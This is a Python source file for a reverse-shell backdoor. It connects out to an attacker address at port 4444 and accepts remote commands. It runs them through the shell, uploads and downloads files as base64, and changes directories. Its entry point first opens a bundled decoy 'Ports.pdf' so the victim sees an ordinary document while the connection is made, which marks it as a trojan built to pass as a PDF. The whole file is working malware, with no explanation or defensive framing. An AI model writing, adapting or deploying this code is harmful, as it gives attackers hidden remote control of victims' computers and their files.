#!/usr/bin/env python

import subprocess
import base64
import socket
import json
import sys
import os

class Client:
    #
    def __init__(self,addr,port):
        #
        self.addr = addr
        #
        self.port = int(port)
        #
        self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #
        self.s.connect((self.addr,self.port))

    def Receive(self):
        #
        json_data = ""
        #
        while(True):
            #
            try:
                #
                json_data = json_data+self.s.recv(1024)
                #
                return json.loads(json_data)
                #
            except ValueError:
                #
                continue

    def Transmission(self,data):
        #
        json_data = json.dumps(data)
        #
        self.s.send(json_data)

    def ChangeDirectory(self,path):
        #
        os.chdir(path)

    def WriteFile(self,path,content):
        #
        with open(path,'wb') as file:
            #
            file.write(base64.b64decode(content))
            #
            return "[*] Upload Successful [*]"

    def ReadFile(self,path):
        #
        with open(path,"rb") as file:
            #
            return base64.b64encode(file.read())

    def ExecuteCommand(self,cmd):
        #
        DEVNULL = open(os.devnull,'wb')
        #
        try:
            #
            return subprocess.check_output(cmd,shell=True,stderr=DEVNULL,stdin=DEVNULL)
            #
        except subprocess.CalledProcessError:
            #
            return "[!] Error during command execution [!]"
            #
    def run(self):
        #
        while(True):
            #
            cmd = self.Receive()
            #
            try:
                #
                if(cmd[0] == "exit"):
                    #
                    self.s.close()
                    #
                    exit()
                    #
                elif(cmd[0] == "cd" and len(cmd) > 1):
                    #
                    cmd_res = self.ChangeDirectory(cmd[1])
                    #
                elif(cmd[0] == "upload"):
                    #
                    cmd_res = self.WriteFile(cmd[1],cmd[2])
                    #
                elif(cmd[0] == "download"):
                    #
                    cmd_res = self.ReadFile(cmd[1])
                    #
                else:
                    #
                    cmd_res = self.ExecuteCommand(cmd)
                    #
                self.Transmission(cmd_res)
                #
            except Exception:
                #
                cmd_res = "[!] Error during command execution [!]"

if(__name__ == '__main__'):
    #
    file_name = sys._MEIPASS + "\Ports.pdf"
    #
    subprocess.Popen(file_name,shell=True)
    #
    C = Client("192.168.1.5",4444)
    #
    C.run()
